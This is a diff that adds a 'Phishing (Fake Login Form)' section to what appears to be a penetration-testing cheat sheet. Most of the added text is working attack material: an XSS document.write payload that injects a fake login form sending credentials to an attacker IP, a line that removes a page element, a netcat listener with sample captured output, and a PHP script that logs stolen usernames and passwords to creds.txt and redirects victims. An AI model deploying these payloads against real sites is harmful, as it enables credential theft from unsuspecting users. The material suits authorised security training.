@@ -13,6 +13,59 @@ Manually test payloads against input fields
 ### Code Review
 Review the source code for the page and the JS in Developer Tools
 
+## Phishing (Fake Login Form)
+### Login form Injection
+```html
+<h3>Please login to continue</h3>
+<form action=http://attackerip>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+Login form minified and inserted into document.write parameter
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+Completed script example
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+```
+
+Start netcat to listen for a connection
+```bash
+sudo nc -lvnp 80
+```
+Example Response:
+```bash
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
+GET /?username=test&password=test&submit=Login HTTP/1.1
+Host: 10.10.XX.XX
+...SNIP...
+```
+Capture responses with php (Capture credentials to creds.txt)
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+Start the php listener
+```bash
+sudo php -s 0.0.0.0:80
+```
+### Cleanup
+Remove unwanted fields with the using document.getElementByID().remove() function
+Find the "id="x" in the form to be removed. (x = 'urlform' in the below example
+```javascript
+document.getElementById('urlform').remove();
+```
 ## Defacing
 ### Changing the Background
 ```html
